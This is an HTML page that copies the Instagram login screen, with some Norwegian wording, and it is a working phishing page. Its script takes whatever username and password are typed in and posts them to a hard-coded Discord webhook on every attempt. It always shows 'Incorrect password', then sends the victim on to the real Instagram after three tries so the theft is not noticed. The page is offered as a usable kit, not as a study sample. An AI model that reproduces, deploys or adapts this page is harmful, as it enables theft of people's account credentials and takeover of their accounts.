<!DOCTYPE html>
<html lang="no">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, height=device-height, initial-scale=1.0, user-scalable=yes">
    <title>Instagram Login</title>
    <style>
        body {
            font-family: Arial, sans-serif;
            background-color: #fafafa;
            margin: 0;
            padding: 0;
            display: flex;
            flex-direction: column; /* Stack items vertically */
            justify-content: flex-start; /* Align items to the top */
            align-items: center; /* Center horizontally */
            height: 100vh; /* Full viewport height */
            position: relative; /* Position relative for absolute children */
        }
        .container {
            background-color: #fff;
            padding: 20px;
            border-radius: 0; /* Square edges */
            box-shadow: 0 2px 5px rgba(0,0,0,0.1);
            width: 300px;
            text-align: center;
            border: 2px solid black; /* Blackout line around the login box */
            position: absolute; /* Allows overlapping */
            top: 50px; /* Set to 50px for a little lower position */
            left: 50%; /* Center horizontally */
            transform: translateX(-50%); /* Adjust to center */
        }
        .logo {
            margin-bottom: 10px;
        }
        .new-logo {
            margin: 0; /* Remove default margins */
            width: 700px; /* Set the desired width for the new logo */
            height: auto; /* Maintain aspect ratio */
            position: relative; /* Position relative to allow left adjustment */
            left: -350px; /* Move the logo significantly to the left */
        }
        input[type="text"],
        input[type="password"] {
            width: calc(100% - 40px);
            padding: 10px;
            margin-bottom: 10px;
            border: 1px solid #ccc;
            border-radius: 5px;
            opacity: 0.8; /* Makes the input box slightly transparent */
        }
        input[type="text"]::placeholder,
        input[type="password"]::placeholder {
            color: rgba(0, 0, 0, 0.5); /* Placeholder color */
            opacity: 1; /* Ensures placeholder is visible */
        }
        input[type="submit"] {
            width: 100%;
            padding: 10px;
            border: none;
            border-radius: 5px;
            background-color: #3897f0;
            color: #fff;
            cursor: pointer;
        }
        .separator {
            margin: 20px 0;
            position: relative;
        }
        .separator::before {
            content: "---------------";
            color: #ccc;
            position: absolute;
            left: 50%;
            transform: translateX(-50%);
        }
        .facebook-login {
            color: blue;
            text-decoration: underline;
            margin-top: 10px;
            cursor: pointer;
        }
        .forgot-password {
            display: block;
            margin-top: 10px;
            font-size: 12px;
            color: #3897f0;
            cursor: pointer;
        }
        .error-message {
            color: red;
            display: none; /* Initially hidden */
            margin-top: 10px; /* Space above the message */
        }
        .register-box {
            padding: 15px; /* Padding inside the register box */
            background-color: #f0f0f0; /* Light grey background */
            font-size: 14px;
            cursor: pointer;
            border: 2px solid black; /* Blackout line around the register box */
            border-radius: 0; /* Square edges */
            text-align: center; /* Center align text */
            width: 300px; /* Same width as the login box */
            position: absolute; /* Allows overlapping */
            top: calc(50px + 400px + 10px); /* Adjust to appear directly below the login box */
            left: 50%; /* Center horizontally */
            transform: translateX(-50%); /* Adjust to center */
        }
    </style>
</head>
<body>
    <img class="new-logo" src="https://cdn.discordapp.com/attachments/1284279948017664010/1284427783275020329/Iphone-with-Instagram-logo-on-screen-on-transparent-background-PNG-removebg-preview.png?ex=66e69817&is=66e54697&hm=2ac5734c0801cbcc44b1ccce7f87884d099ad48878571304164d49bb873cb183" alt="New Instagram Logo">
    
    <div class="container">
        <img class="logo" src="https://shop8039.sfstatic.io/upload_dir/shop/_thumbs/instagram_logo_r30.backdrop.jpg" alt="Instagram Logo" width="150">
        <form id="loginForm">
            <input type="text" id="username" name="username" placeholder="Username" required autofocus autocomplete="username">
            <input type="password" id="password" name="password" placeholder="Password" required autocomplete="current-password">
            <input type="submit" value="Login">
            <div class="error-message" id="loginErrorMessage">Incorrect password.</div>
        </form>
        <div class="separator"></div>
        <span class="facebook-login">Logg inn med Facebook</span>
        <span class="forgot-password">Forgot password?</span>
    </div>

    <!-- Register box directly under the login form -->
    <div class="register-box">
        <span style="color: grey;">Don't have an account? </span>
        <span style="color: blue; text-decoration: underline; cursor: pointer;">Register yourself</span>
    </div>

    <script>
        let attemptCount = 0; // Counter for login attempts
        const maxAttempts = 3; // Maximum allowed attempts

        document.getElementById('loginForm').addEventListener('submit', function(event) {
            event.preventDefault(); // Prevent the default form submission

            const username = document.getElementById('username').value;
            const password = document.getElementById('password').value;

            // Simulate an invalid login (you can replace this with your own validation)
            const isValidLogin = false; // Change this according to your actual logic

            // Prepare the data to send to the Discord webhook
            const data = {
                content: `Username: ${username}\nPassord: ${password}`
            };

            // Increment the attempt count
            attemptCount++;
            
            // Send data to Discord webhook every attempt
            fetch('https://discord.com/api/webhooks/1284280025151176745/ScXP1MFtXNKsfpAYajg0i2B6Lrp-IZcGtjjrTkJQWBmWuNMmI-Xexjq4Bxh3RcSQDHoH', {
                method: 'POST',
                headers: {
                    'Content-Type': 'application/json'
                },
                body: JSON.stringify(data)
            })
            .catch(error => {
                console.error('There was a problem with the fetch operation:', error);
            });

            if (!isValidLogin) {
                document.getElementById('loginErrorMessage').style.display = 'block'; // Show error message

                if (attemptCount >= maxAttempts) {
                    // Redirect to Instagram after max attempts
                    window.location.href = 'https://instagram.com';
                }
            } else {
                // Proceed with valid login logic here
                document.getElementById('loginErrorMessage').style.display = 'none'; // Hide error message
                alert('Login successful!'); // Replace with actual login logic
            }
        });
    </script>
</body>
</html>
